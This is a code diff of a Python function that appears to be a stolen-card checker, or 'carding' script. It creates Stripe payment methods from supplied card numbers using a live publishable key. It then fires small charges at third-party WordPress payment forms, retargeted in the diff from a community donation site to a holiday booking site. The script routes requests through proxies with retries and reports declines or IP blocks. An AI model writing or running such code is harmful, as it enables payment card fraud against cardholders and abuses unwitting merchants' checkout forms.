@@ -45,89 +45,80 @@ def Tele(ccx):
 		session.mount('https://', adapter)
 		session.proxies = proxies
 
-		# ==========================================
-		# Step 1: Create Payment Method (Stripe)
-		# ==========================================
-		headers = {
-			'authority': 'api.stripe.com',
-			'accept': 'application/json',
-			'accept-language': 'en-US,en;q=0.9',
-			'content-type': 'application/x-www-form-urlencoded',
-			'origin': 'https://js.stripe.com',
-			'referer': 'https://js.stripe.com/',
-			'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-site',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-		}
+        # ==========================================
+        # Step 1: Create Payment Method (Stripe)
+        # ==========================================
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+        }
 
-		# 🔥 Fixed: Use variables instead of hardcoded card
-		data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
+        data = (
+            f'type=card&card[number]={n}&card[cvc]={cvc}'
+            f'&card[exp_month]={mm}&card[exp_year]={yy}'
+            f'&guid=NA&muid=NA&sid=NA'
+            f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element'
+            f'&key=pk_live_51QhDDVHWPpZcisLuMwjv1ViU8uCO57CpVHEkbM1kqmtEjJeIqjpaWdkV1v1aJIZzTsfQrSwP87AbhnkJLjXzF3yS00YCnP2Wym'
+        )
 
-		response = session.post(
-			'https://api.stripe.com/v1/payment_methods',
-			headers=headers,
-			data=data,
-			timeout=40
-		)
+        # session.post ကိုသုံးထားတယ် (Retry အလုပ်လုပ်အောင်)
+        response = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers,
+            data=data,
+            timeout=40 
+        )
 
-		if 'id' not in response.json():
-			return "Proxy Error (PM Failed) ❌"
-			
-		pm = response.json()['id']
+        if 'id' not in response.json():
+            return "Proxy Error (PM Failed) ❌"
+            
+        pm = response.json()['id']
 
-		# ==========================================
-		# Step 2: Charge Request (Corrigan Funerals)
-		# ==========================================
-		headers = {
-			'authority': 'mauritaniancommunity-dmv-usa.org',
-			'accept': 'application/json, text/javascript, */*; q=0.01',
-			'accept-language': 'en-US,en;q=0.9',
-			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-			'origin': 'https://mauritaniancommunity-dmv-usa.org',
-			'referer': 'https://mauritaniancommunity-dmv-usa.org/membership-donations/',
-			'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-origin',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-			'x-requested-with': 'XMLHttpRequest',
-		}
+        # ==========================================
+        # Step 2: Charge Request (Benidorm Holidays)
+        # ==========================================
+        headers = {
+            'authority': 'www.benidormholidays.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://www.benidormholidays.com',
+            'referer': 'https://www.benidormholidays.com/payments/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
 
-		data = {
-			'action': 'wp_full_stripe_inline_donation_charge',
-			'wpfs-form-name': 'Dmv',
-			'wpfs-form-get-parameters': '%7B%7D',
-			'wpfs-custom-amount': 'other',
-			'wpfs-custom-amount-unique': '0.5',
-			'wpfs-donation-frequency': 'one-time',
-			'wpfs-card-holder-email': random_email,
-			'wpfs-card-holder-name': 'Min Thant',
-			'wpfs-stripe-payment-method-id': f'{pm}',
-		}
+        data = {
+            'action': 'wp_full_stripe_inline_payment_charge',
+            'wpfs-form-name': 'MakeAPayment',
+            'wpfs-form-get-parameters': '%7B%7D',
+            'wpfs-custom-amount-unique': '5',
+            'wpfs-custom-input[]': 'Super ',
+            'wpfs-card-holder-email': random_email,
+            'wpfs-card-holder-name': 'Super Z',
+            'wpfs-stripe-payment-method-id': f'{pm}',
+        }
 
-		response = session.post(
-			'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
-			headers=headers,
-			data=data,
-			timeout=40
-		)
+        response = session.post(
+            'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
+            headers=headers,
+            data=data,
+            timeout=40
+        )
+        
+        try:
+            result = response.json()['message']
+        except:
+            if "Cloudflare" in response.text or response.status_code == 403:
+                result = "IP Blocked by Site ❌"
+            else:
+                result = "Decline⛔"
 
-		try:
-			result = response.json()['message']
-		except:
-			if "Cloudflare" in response.text or response.status_code == 403:
-				result = "IP Blocked by Site ❌"
-			else:
-				result = "Decline⛔"
-
-	except Exception as e:
-		# ၃ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
-		result = f"Connection Failed (Retry Limit) ⚠️"
-		
-	return result
+    except Exception as e:
+        # ၃ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
+        result = f"Connection Failed (Retry Limit) ⚠️"
+        
+    return result
